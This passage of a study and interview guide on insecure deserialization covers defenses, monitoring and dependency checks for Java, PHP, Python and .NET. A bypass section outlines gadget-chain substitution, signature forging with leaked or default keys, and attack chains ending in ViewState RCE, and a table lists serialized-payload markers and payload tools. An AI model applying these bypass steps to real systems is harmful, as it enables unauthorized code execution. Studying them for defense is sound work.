   → Block Java serialization ports (RMI: 1099, IIOP: 1050) from external access
   → WAF rules to detect AC ED 00 05 / rO0AB patterns (limited effectiveness)

3. SANDBOXING
   → Run deserialization in isolated containers/processes with no network access
   → Use seccomp/AppArmor to restrict system calls from deserializing processes

4. MONITORING & ALERTING
   → Alert on: ClassNotFoundException, InvalidClassException, ClassCastException
   → Alert on: Unusual process spawning after HTTP requests
   → Monitor for DNS lookups to unknown external domains (OOB detection)
```

### Dependency Management

```bash
# Java: Check for known vulnerable versions
mvn versions:display-dependency-updates
# commons-collections < 3.2.2 → vulnerable
# commons-beanutils < 1.9.4 → vulnerable

# Python: Keep PyYAML >= 6.0
pip install --upgrade pyyaml

# .NET: Remove all BinaryFormatter references
# Add to project file to fail build if found:
<PropertyGroup>
  <EnableUnsafeBinaryFormatterSerialization>false</EnableUnsafeBinaryFormatterSerialization>
</PropertyGroup>
```

---

## 16. Bypass Techniques (Advanced)

### Bypassing Blacklists (Java)

```
If server blocks "CommonsCollections" → try different gadget chains:
- CommonsCollections1 blocked → try CC6, CC7
- Try: Spring1, Spring4, Groovy1, JDK7u21, JDK8u20, Hibernate1, ROME
- Use GadgetProbe to remotely fingerprint available chains
```

### Bypassing Signature Validation

```
1. Known/Weak Key → Forge signature (Apache Shiro default key attack)
2. Key in Config File → If you can read web.config, machine.config → get key
3. Padding Oracle Attack → Against CBC-mode encrypted+signed data
4. Timing Oracle → Weak compare_digest implementation
5. Type Confusion → Send data in unexpected format (e.g., send JSON where XML expected)
```

### Chaining with Other Vulnerabilities

```
SSRF → Deserialization:
  → SSRF to reach internal Java RMI/IIOP endpoint → trigger deserialization

File Upload → Deserialization:
  → Upload .ser file → trigger through separate endpoint that deserializes uploads

XXE → File Read → Key Disclosure → Signature Bypass → Deserialization:
  → XXE to read web.config → get machine key → forge ViewState → RCE
```

---

## 17. Interview Cheat Sheet — Quick Reference

### "Tell me about Insecure Deserialization in 60 seconds"

> Insecure Deserialization happens when an application reconstructs objects from untrusted data — like a cookie or POST body — without validating what's in it. In the worst case, this leads to Remote Code Execution, because certain Java, PHP, Python, or .NET class libraries have "gadget chains" — existing methods that chain together during deserialization to execute OS commands. The fix is to never deserialize untrusted data if possible, or to use class whitelisting, HMAC signing before deserialization, and safer data formats like JSON.

---

### Key Identifiers by Language

| Language | Serialized Data Marker | Key Function to Search |
|----------|------------------------|------------------------|
| Java | `rO0AB` / `AC ED 00 05` | `readObject()` |
| PHP | `O:N:"Class":` | `unserialize()` |
| Python | `\x80\x04` / gASV | `pickle.loads()` |
| .NET | `AAEAAAD/////` | `BinaryFormatter.Deserialize()` |
| Ruby | `\x04\x08` | `Marshal.load()` |
| Node.js | `{"rce":"_$$ND_FUNC$$_` | `node-serialize.unserialize()` |

---

### Top Tools

```
Recon/Detection:   Burp Suite + Freddy extension, nuclei
Java payloads:     ysoserial (URLDNS → CommonsCollections6)
PHP payloads:      phpggc
.NET payloads:     ysoserial.net
Out-of-band:       Burp Collaborator, interactsh
Analysis:          SerializationDumper, GadgetProbe
```

---

### OWASP Mapping

```
OWASP Top 10 2021: A08 — Software and Data Integrity Failures
CWE-502: Deserialization of Untrusted Data
CAPEC-586: Object Injection
```

---

### 5 Most Important Interview Points

```
1. Gadget chains use EXISTING classes — no malware injection needed
2. Exploit fires DURING deserialization — BEFORE app logic runs
3. HMAC alone doesn't protect if key is leaked/weak
4. URLDNS gadget = safe detection method (DNS only, no RCE)
5. Best fix = avoid complex deserialization of untrusted data entirely; use JSON/Protobuf
```

---

*Guide Version 1.0 | Covers Java, PHP, Python, .NET, Node.js | OWASP A08:2021*
